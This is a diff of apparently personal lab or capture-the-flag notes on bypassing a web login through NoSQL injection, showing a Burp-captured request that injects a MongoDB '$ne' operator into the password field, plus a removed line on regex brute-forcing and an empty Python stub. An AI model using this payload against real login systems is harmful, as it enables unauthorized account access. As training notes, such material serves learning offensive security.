@@ -8,18 +8,6 @@ From BURP:
 
 * we change Content type to JSON
 * and we add bottom json part from normal login, $ne is MangoDB to not EQUAL
-* And on top of that we can use regex instead of $ne to "bruteforce" the login, basically one letter at the time: [https://youtu.be/ahzOprfN--Y](https://youtu.be/ahzOprfN--Y?t=517)
-
-```
-import requests
-
-def login(pw):
-	
-```
-
-
-
-
 
 POST /login HTTP/1.1
 Host: 10.129.96.160:5000
@@ -39,3 +27,4 @@ Connection: keep-alive
 **"password":{"$ne":"Invalid Password"}**
 **}**
 
+Once logged in
